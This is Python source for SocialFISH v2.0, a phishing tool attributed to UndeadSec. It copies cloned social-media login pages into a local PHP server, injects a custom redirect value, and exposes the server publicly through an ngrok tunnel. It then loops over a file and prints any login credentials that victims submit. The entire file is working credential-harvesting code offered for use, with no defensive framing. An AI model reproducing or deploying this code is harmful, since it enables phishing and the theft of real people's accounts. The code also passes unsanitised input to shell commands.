######################################################
#                                                    #
#       SOCIALFISH v2.0                              #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################

from contextlib import contextmanager
import json
import requests
import os
from time import sleep
from huepy import *
import subprocess
    
def runPhishing(social, custom):
    os.system('rm -Rf base/Server/www/*.* && touch base/Server/www/cat.txt')   
    command = 'cp base/WebPages/%s/*.* base/Server/www/' % social.lower()
    os.system(command)
    with open('base/Server/www/login.php') as f:
        read_data = f.read()   
    c = read_data.replace('<CUST0M>', custom)
    f = open('base/Server/www/login.php', 'w')
    f.write(c)
    f.close()

def waitCreds():
    print(cyan(" [*] Waiting for credentials... "))
    while True:
        with open('base/Server/www/cat.txt') as creds:
            lines = creds.read().rstrip()
        if len(lines) != 0: 
            print(green('\n [*] Credentials found:\n %s' % lines))                        
            os.system('rm -rf base/Server/www/cat.txt && touch base/Server/www/cat.txt')
        creds.close()

def runServer():
    os.system("cd base/Server/www/ && php -n -S 127.0.0.1:1449 > /dev/null 2>&1 &")

@contextmanager
def ngrok_start():
    ngrok_process = subprocess.Popen(['ngrok','http','1449'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    while True:
        try:
            ngrok_url = requests.get('http://127.0.0.1:4040/api/tunnels/command_line')
            if ngrok_url.status_code == 200:
                public_url = json.loads(ngrok_url.text)['public_url']
                print(green('\n [*] Ngrok URL: %s' % public_url))
                print(yellow(' [^] Press Ctrl+C or VolDown+C(android) to quit'))
                yield public_url
                break
        except requests.exceptions.ConnectionError:
            sleep(.5)
    os.kill(ngrok_process.pid, 15)

